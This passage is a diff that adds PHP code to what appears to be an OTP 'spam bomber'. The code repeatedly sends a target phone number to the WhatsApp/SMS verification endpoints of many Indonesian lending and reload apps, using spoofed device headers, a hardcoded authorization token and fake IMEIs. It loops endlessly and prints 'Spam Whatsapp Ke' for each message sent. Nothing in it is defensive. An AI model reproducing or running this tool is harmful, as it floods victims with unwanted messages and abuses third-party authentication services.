+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
 echo color("yellow"," Done Sensei..\n");
 sleep(3);
 goto lagi;
